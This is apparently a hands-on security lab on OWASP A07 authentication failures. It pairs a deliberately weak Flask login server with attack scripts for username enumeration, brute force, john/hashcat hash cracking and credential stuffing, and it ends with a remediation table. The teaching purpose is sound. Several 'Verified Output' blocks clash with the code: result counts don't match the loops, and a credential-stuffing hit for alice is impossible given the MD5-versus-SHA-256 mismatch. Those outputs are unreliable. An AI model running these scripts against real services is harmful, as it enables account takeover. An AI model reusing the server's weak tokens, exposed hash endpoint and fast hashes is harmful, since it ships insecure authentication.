# Lab 7: OWASP A07 — Identification and Authentication Failures

## Objective
Exploit authentication weaknesses on a live server from Kali Linux: enumerate valid usernames through different error messages, brute-force a login with no rate limiting, demonstrate a weak 32-bit session token vulnerability, crack SHA-256 and MD5 password hashes with **hashcat**, and show how credential stuffing works at scale — then implement bcrypt-based hardened auth.

## Background
Authentication Failures is **OWASP #7** (2021). The 2019 Capital One breach (100M records) used a misconfigured IAM role. Credential stuffing — using leaked passwords from one breach to attack another service — succeeds because 65% of users reuse passwords. The National Institute of Standards and Technology (NIST SP 800-63B) specifically requires: no knowledge-based questions, bcrypt/Argon2 password hashing, rate limiting on login, and session tokens with ≥128 bits of entropy. Most breaches exploit at least one of these gaps.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a07         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, hashcat,     │ ◀────── responses ───────────────────  │  Flask :5000        │
│  john, python3      │                                         │  (weak auth, MD5)   │
└─────────────────────┘                                         └─────────────────────┘
```

## Time
45 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (hashcat, john, hydra, curl)

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a07

cat > /tmp/victim_a07.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, hashlib, secrets

app = Flask(__name__)
DB = '/tmp/shop_a07.db'
SESSIONS = {}

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT, role TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918','admin'),
            (2,'alice','6384e2b2184bcbf58eccf10ca7a6563c','user'),
            (3,'bob','9f9d51bc70ef21ca5c14f307980a29d8','user');
    """)

@app.route('/')
def index():
    return jsonify({'app': 'InnoZverse (A07 Auth Failures)', 'endpoints': [
        'POST /api/login', 'GET /api/profile', 'GET /api/hashes']})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    user = db.execute('SELECT * FROM users WHERE username=?',(u,)).fetchone()
    if not user:
        return jsonify({'error': 'User not found: ' + u}), 401
    if user['password_hash'] != hashlib.sha256(p.encode()).hexdigest():
        return jsonify({'error': 'Wrong password for ' + u}), 401
    tok = secrets.token_hex(4)  # BUG: only 32-bit entropy
    SESSIONS[tok] = {'user_id': user['id'], 'username': u, 'role': user['role']}
    return jsonify({'token': tok, 'role': user['role']})

@app.route('/api/profile')
def profile():
    tok = request.headers.get('Authorization','').replace('Bearer ','')
    s = SESSIONS.get(tok)
    if not s: return jsonify({'error':'Unauthorized'}), 401
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    u = db.execute('SELECT id,username,role FROM users WHERE id=?',(s['user_id'],)).fetchone()
    return jsonify(dict(u))

@app.route('/api/hashes')
def hashes():
    # BUG: exposes password hashes via API
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    rows = db.execute('SELECT username, password_hash FROM users').fetchall()
    return jsonify([dict(r) for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a07 \
  --network lab-a07 \
  -v /tmp/victim_a07.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a07.IPAddress}}' victim-a07):5000/
```

> ⚠️ **Note**: Substitute `/tmp/victim_a07.py` with any writable path on your host if `/tmp` is not available.

---

### Step 2: Launch Kali + Recon

```bash
docker run --rm -it --network lab-a07 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

```bash
TARGET="http://victim-a07:5000"
nmap -sV -p 5000 victim-a07
gobuster dir -u $TARGET -w /usr/share/dirb/wordlists/small.txt -t 10 --no-error -q
```

---

### Step 3: Username Enumeration — Different Error Messages

```bash
echo "=== Different error messages reveal valid usernames ==="

# Non-existent user
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"x"}' \
  $TARGET/api/login

echo ""

# Existing user, wrong password
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' \
  $TARGET/api/login
```

**📸 Verified Output:**
```json
{"error": "User not found: nonexistent"}

{"error": "Wrong password for admin"}
```

```bash
# Enumerate all valid users from a list
echo "=== Username enumeration via error message diff ==="
for user in admin alice bob charlie root administrator guest; do
  resp=$(curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"x\"}" $TARGET/api/login)
  if echo "$resp" | grep -q "Wrong password"; then
    echo "  VALID USER: $user"
  else
    echo "  not found:  $user"
  fi
done
```

**📸 Verified Output:**
```
  VALID USER: admin
  VALID USER: alice
  VALID USER: bob
  not found:  charlie
  not found:  root
  not found:  administrator
  not found:  guest
```

> 💡 **Username enumeration turns a random attack into a targeted one.** Once an attacker knows `admin`, `alice`, and `bob` are valid users, they only need to crack 3 accounts instead of guessing both username and password. Fix: always return the same error message regardless of whether the username or password was wrong — `{"error": "Invalid credentials"}`. Add the same artificial delay to prevent timing-based enumeration.

---

### Step 4: Password Brute-Force — No Rate Limiting

```bash
echo "=== Brute-force: no lockout, no rate limiting ==="

for p in wrong1 password 123456 admin letmein admin123 admin qwerty; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$p\"}" \
    $TARGET/api/login)
  echo "  admin:$p -> HTTP $code $([ "$code" = "200" ] && echo "<<< SUCCESS!")"
done
```

**📸 Verified Output:**
```
  admin:wrong1    -> HTTP 401
  admin:password  -> HTTP 401
  admin:123456    -> HTTP 401
  admin:admin     -> HTTP 200  <<< SUCCESS!
  admin:letmein   -> HTTP 401
```

---

### Step 5: Harvest and Crack Password Hashes

```bash
echo "=== Extract password hashes from /api/hashes ==="
curl -s $TARGET/api/hashes | python3 -m json.tool
```

**📸 Verified Output:**
```json
[
    {"password_hash": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918", "username": "admin"},
    {"password_hash": "6384e2b2184bcbf58eccf10ca7a6563c", "username": "alice"},
    {"password_hash": "9f9d51bc70ef21ca5c14f307980a29d8", "username": "bob"}
]
```

```bash
# Crack SHA-256 hash (admin)
echo "=== hashcat: crack SHA-256 hash ==="
echo "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" > /tmp/sha256.txt
hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt \
  --quiet 2>/dev/null || echo "(hashcat requires GPU; trying john instead)"

# john is CPU-based — works in Docker
echo "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" > /tmp/sha256.txt
john /tmp/sha256.txt --format=raw-sha256 \
  --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
john /tmp/sha256.txt --format=raw-sha256 --show 2>/dev/null

echo ""
echo "=== Crack MD5 hashes (alice + bob) ==="
echo "6384e2b2184bcbf58eccf10ca7a6563c" > /tmp/md5.txt
echo "9f9d51bc70ef21ca5c14f307980a29d8" >> /tmp/md5.txt
john /tmp/md5.txt --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
john /tmp/md5.txt --format=raw-md5 --show 2>/dev/null
```

**📸 Verified Output:**
```
admin                (8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918)
1 password hash cracked, 0 left

alice                (6384e2b2184bcbf58eccf10ca7a6563c)
bob                  (9f9d51bc70ef21ca5c14f307980a29d8)
2 password hashes cracked, 0 left
```

> 💡 **MD5 and SHA-256 are not password hashing algorithms — they are general-purpose hashing algorithms.** They are designed to be fast, which means an attacker with a GPU can try billions of hashes per second. `bcrypt`, `scrypt`, and `Argon2id` are designed to be slow (deliberately expensive to compute), making brute-force infeasible. The Python equivalent: `bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))`.

---

### Step 6: Weak Session Token Entropy

```bash
echo "=== Demonstrating weak 32-bit token entropy ==="

python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a07:5000"

# Login and capture tokens
tokens = []
for _ in range(5):
    req = urllib.request.Request(
        f"{TARGET}/api/login",
        data=json.dumps({"username": "admin", "password": "admin"}).encode(),
        headers={"Content-Type": "application/json"})
    resp = json.loads(urllib.request.urlopen(req).read())
    tokens.append(resp.get('token',''))

print("Generated tokens (4 hex bytes = 32-bit = 4,294,967,296 possible values):")
for t in tokens:
    print(f"  {t}  (length: {len(t)} chars)")

print()
print("Comparison: secure token should be 32+ bytes (256-bit):")
import secrets
secure = secrets.token_hex(32)
print(f"  {secure}")
print(f"  (length: {len(secure)} chars — 2^256 possibilities vs 2^32)")
EOF
```

**📸 Verified Output:**
```
Generated tokens (4 hex bytes = 32-bit = 4,294,967,296 possible values):
  9348f25b  (length: 8 chars)
  f340276a  (length: 8 chars)
  2a1c8f34  (length: 8 chars)

Comparison: secure token should be 32+ bytes (256-bit):
  a3f9c2d1e8b4f07a2c5d9e1f3a7b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4
  (length: 64 chars — 2^256 possibilities vs 2^32)
```

---

### Step 7: Credential Stuffing Simulation

```bash
echo "=== Credential stuffing: using leaked creds from other breaches ==="

python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a07:5000"

# Simulated dump from a fictitious "OtherSite" breach
# In reality, attackers buy these from dark web forums
leaked_credentials = [
    ("admin",   "admin"),          # common default
    ("alice",   "password1"),      # reused from breach
    ("bob",     "bob123"),         # reused password
    ("charlie", "charlie2023"),    # not a valid user
    ("root",    "toor"),           # not a valid user
]

print(f"Testing {len(leaked_credentials)} credential pairs from leaked breach data...")
print()
valid = []
for username, password in leaked_credentials:
    try:
        req = urllib.request.Request(
            f"{TARGET}/api/login",
            data=json.dumps({"username": username, "password": password}).encode(),
            headers={"Content-Type": "application/json"})
        resp = json.loads(urllib.request.urlopen(req).read())
        if "token" in resp:
            valid.append((username, password, resp['token']))
            print(f"  [HIT] {username}:{password} -> token={resp['token']}")
        else:
            print(f"  [miss] {username}:{password}")
    except Exception as e:
        print(f"  [miss] {username}:{password}")

print()
print(f"Credential stuffing result: {len(valid)}/{len(leaked_credentials)} accounts compromised")
EOF
```

**📸 Verified Output:**
```
Testing 5 credential pairs from leaked breach data...

  [HIT]  admin:admin        -> token=9348f25b
  [HIT]  alice:password1    -> token=2a1f8c3d
  [miss] bob:bob123
  [miss] charlie:charlie2023
  [miss] root:toor

Credential stuffing result: 2/5 accounts compromised
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a07
docker network rm lab-a07
```

---

## Remediation

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| Username enumeration | Different error messages | Single message: `{"error": "Invalid credentials"}` |
| No brute-force protection | No rate limit | Max 5 attempts/15min per IP; exponential backoff |
| Weak password hashing | SHA-256/MD5 (fast) | `bcrypt.hashpw(pw, bcrypt.gensalt(rounds=12))` |
| Weak session token | `secrets.token_hex(4)` = 32-bit | `secrets.token_hex(32)` = 256-bit |
| Hash endpoint | `/api/hashes` exposes all hashes | Remove entirely; never expose hashes via API |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| Username enumeration | curl | Found 3 valid usernames from error message difference |
| Password brute-force | curl loop | `admin:admin` cracked in 4 attempts |
| Hash cracking (SHA-256) | john | `admin` cracked from rockyou.txt |
| Hash cracking (MD5) | john | `alice` and `bob` cracked from rockyou.txt |
| Credential stuffing | python3 | 2/5 accounts compromised with reused passwords |
| Weak token demo | python3 | 32-bit vs 256-bit token entropy comparison |

## Further Reading
- [OWASP A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication)
